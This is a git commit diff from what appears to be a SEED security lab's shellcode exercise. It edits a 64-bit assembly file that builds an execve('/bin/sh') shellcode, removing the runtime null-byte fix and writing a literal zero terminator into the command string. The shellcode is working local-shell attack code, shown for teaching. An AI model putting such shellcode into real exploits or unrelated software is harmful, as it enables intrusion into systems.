1d23e4e2155f9eb8ea1032ffd4a4c32d43b64b0a
Kevin Du <kevin@seed>
2025-08-15 14:21:08 +0800

    removed some code

--- category-software/Shellcode/Labsetup/mysh64.s
+++ category-software/Shellcode/Labsetup/mysh64.s
@@ -6,9 +6,6 @@ section .text
     one:
  	pop rbx           
 
-        xor al, al
-        mov [rbx+7],  al
-
  	mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
 	mov rax, 0x00      ; rax = 0
  	mov [rbx+16], rax  ; store rax to memory at address rbx + 16
@@ -20,6 +17,6 @@ section .text
  	syscall
      two:
         call one                                                                   
-        db '/bin/sh', 0xFF ; The command string (terminated by a zero)
+        db '/bin/sh', 0x00 ; The command string (terminated by a zero)
         db 'AAAAAAAA'      ; Place holder for argv[0] 
         db 'BBBBBBBB'      ; Place holder for argv[1]
